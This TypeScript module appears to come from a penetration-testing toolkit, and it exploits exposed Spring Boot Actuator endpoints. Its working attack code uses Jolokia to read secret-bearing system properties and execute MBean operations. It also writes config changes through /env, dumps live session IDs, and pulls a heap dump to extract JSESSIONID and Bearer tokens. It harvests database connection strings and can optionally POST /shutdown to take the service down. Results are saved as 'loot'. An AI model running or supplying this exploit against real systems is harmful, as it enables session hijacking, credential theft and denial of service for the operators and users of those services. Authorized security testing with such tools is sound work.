import { fetchUrl } from "../adapters/http.js";
import { writeArtifact } from "../adapters/artifacts.js";

/** Actuator write-path exploitation, one level past `actuator-exploit`:
 *  Jolokia MBean read/exec (system properties, explicit GC), env mutation
 *  verified through the loggers endpoint (proves a writable config channel),
 *  spring-session ID dump, heap-dump token extraction and datasource URL
 *  harvest. `--shutdown` additionally POSTs /shutdown (the service stops). */

export interface ActRceInput {
  readonly baseUrl: string;
  readonly outputRoot: string;
  readonly cookie?: string;
  readonly bearer?: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  readonly maxHeapBytes?: number;
  /** Call /actuator/shutdown at the end (service goes down). */
  readonly shutdown?: boolean;
}

export interface ActRceAction {
  readonly name: string;
  readonly status: number;
  readonly evidence: string;
}

export interface ActRceResult {
  readonly base: string;
  readonly actions: ActRceAction[];
  readonly loot: {
    readonly systemProperties?: { key: string; masked: string }[];
    readonly sessions?: string[];
    readonly heapTokens?: string[];
    readonly datasourceUrls?: string[];
  };
  readonly artifacts: { path: string; bytes: number }[];
}

const SECRET_KEY = /(password|passwd|secret|token|credential|accesskey|access-key|private|jdbc:|mongodb:|redis:|amqp:)/i;
const mask = (s: string): string => (s.length <= 8 ? `${s.slice(0, 2)}***` : `${s.slice(0, 4)}***${s.slice(-2)} (${s.length})`);

const hdrs = (input: ActRceInput, extra?: Record<string, string>): Record<string, string> => {
  const h: Record<string, string> = { ...(input.headers ?? {}) };
  if (input.cookie) h.cookie = input.cookie;
  if (input.bearer) h.authorization = `Bearer ${input.bearer}`;
  if (extra) Object.assign(h, extra);
  return h;
};

const call = (url: string, input: ActRceInput, extra: { method?: string; body?: string; raw?: boolean; maxBytes?: number } = {}) => fetchUrl(url, {
  method: extra.method ?? "GET", body: extra.body,
  headers: hdrs(input, extra.body ? { "content-type": "application/json" } : undefined),
  maxAttempts: 1, redirect: "manual", proxy: input.proxy, timeoutMs: input.timeoutMs ?? 12_000, maxBytes: extra.maxBytes ?? 2 * 1024 * 1024, raw: extra.raw,
});

export const exploitActuator = async (input: ActRceInput): Promise<ActRceResult> => {
  const root = new URL(input.baseUrl).href.replace(/\/$/, "");
  let base = `${root}/actuator`;
  const idx = await call(base, input, { maxBytes: 128 * 1024 });
  if (!(idx.status === 200 && /_links/.test(idx.body))) {
    const alt = await call(`${root}/health`, input, { maxBytes: 32 * 1024 });
    if (alt.status === 200 && /"status"/.test(alt.body)) base = root;
    else if (idx.status === 0) return { base, actions: [], loot: {}, artifacts: [] };
  }
  const actions: ActRceAction[] = [];
  const loot: { systemProperties?: { key: string; masked: string }[]; sessions?: string[]; heapTokens?: string[]; datasourceUrls?: string[] } = {};

  // 1) Jolokia — read system properties (secrets) and run an MBean.
  for (const jbase of [`${base}/jolokia`, `${root}/jolokia`]) {
    const list = await call(`${jbase}/list`, input, { maxBytes: 256 * 1024 });
    if (list.status !== 200) continue;
    actions.push({ name: "jolokia", status: list.status, evidence: `${(list.body.match(/"operation"/g) ?? []).length} operation(s) exposed` });
    const props = await call(`${jbase}/read/java.lang:type=Runtime/SystemProperties`, input, { maxBytes: 1024 * 1024 });
    if (props.status === 200) {
      try {
        const value = (JSON.parse(props.body) as { value?: Record<string, string> }).value ?? {};
        const hits = Object.entries(value).filter(([k]) => SECRET_KEY.test(k)).map(([k, v]) => ({ key: k, masked: mask(String(v)) }));
        loot.systemProperties = hits;
        actions.push({ name: "jolokia-sysprops", status: props.status, evidence: `${hits.length} secret-shaped system property(s)` });
      } catch { /* non-json */ }
    }
    const gc = await call(`${jbase}/exec/java.lang:type=Memory/gc`, input, { maxBytes: 64 * 1024 });
    actions.push({ name: "jolokia-exec-gc", status: gc.status, evidence: gc.body.slice(0, 120) });
    break;
  }

  // 2) env write → refresh → loggers. Proves a persistent config channel.
  const write = await call(`${base}/env`, input, { method: "POST", body: JSON.stringify({ name: "logging.level.root", value: "DEBUG" }) });
  if (write.status >= 200 && write.status < 300) {
    await call(`${base}/refresh`, input, { method: "POST", body: "{}" });
    const loggers = await call(`${base}/loggers`, input, { maxBytes: 512 * 1024 });
    const debug = /"ROOT"\s*:\s*\{[^}]*"effectiveLevel"\s*:\s*"DEBUG"/.test(loggers.body) || /"effectiveLevel"\s*:\s*"DEBUG"/.test(loggers.body);
    actions.push({ name: "env-write-refresh", status: write.status, evidence: debug ? "logging.level.root=DEBUG took effect — writable config channel" : `env POST ${write.status}, loggers unchanged` });
  } else {
    actions.push({ name: "env-write-refresh", status: write.status, evidence: `env POST ${write.status}` });
  }

  // 3) spring-session IDs.
  const sess = await call(`${base}/sessions`, input, { maxBytes: 512 * 1024 });
  if (sess.status === 200) {
    try {
      const ids = (JSON.parse(sess.body) as string[]).map(String).slice(0, 20);
      loot.sessions = ids;
      actions.push({ name: "sessions", status: sess.status, evidence: `${ids.length} live session id(s)` });
    } catch { actions.push({ name: "sessions", status: sess.status, evidence: "non-array body" }); }
  }

  // 4) heap dump → session/bearer tokens.
  const heap = await call(`${base}/heapdump`, input, { raw: true, maxBytes: input.maxHeapBytes ?? 40 * 1024 * 1024 });
  if (heap.rawBuffer) {
    const text = heap.rawBuffer.toString("latin1");
    const tokens = new Set<string>();
    for (const m of text.matchAll(/JSESSIONID[=":\s]+([A-F0-9]{16,})/g)) tokens.add(`JSESSIONID:${m[1]}`);
    for (const m of text.matchAll(/Bearer\s+([A-Za-z0-9\-._~+/]{20,})/g)) tokens.add(`Bearer:${(m[1] ?? "").slice(0, 40)}…`);
    loot.heapTokens = [...tokens].slice(0, 20);
    actions.push({ name: "heap-tokens", status: heap.status, evidence: `${loot.heapTokens.length} token(s) in ${Math.round(heap.bytes / 1024)}KiB dump` });
  }

  // 5) datasource URLs from configprops/env.
  const cp = await call(`${base}/configprops`, input);
  const urls = new Set<string>();
  for (const m of cp.body.matchAll(/"(?:url|jdbcUrl)"\s*:\s*"((?:jdbc|mongodb|redis|amqp)[^"]+)"/g)) urls.add(m[1] ?? "");
  if (urls.size) { loot.datasourceUrls = [...urls]; actions.push({ name: "datasource-urls", status: cp.status, evidence: `${urls.size} connection string(s)` }); }

  if (input.shutdown) {
    const down = await call(`${base}/shutdown`, input, { method: "POST" });
    actions.push({ name: "shutdown", status: down.status, evidence: down.body.slice(0, 100) });
  }

  const body = JSON.stringify({ base, actions, loot }, null, 2);
  const artifact = await writeArtifact(input.outputRoot, "actuator_rce.json", body);
  return { base, actions, loot, artifacts: [artifact] };
};
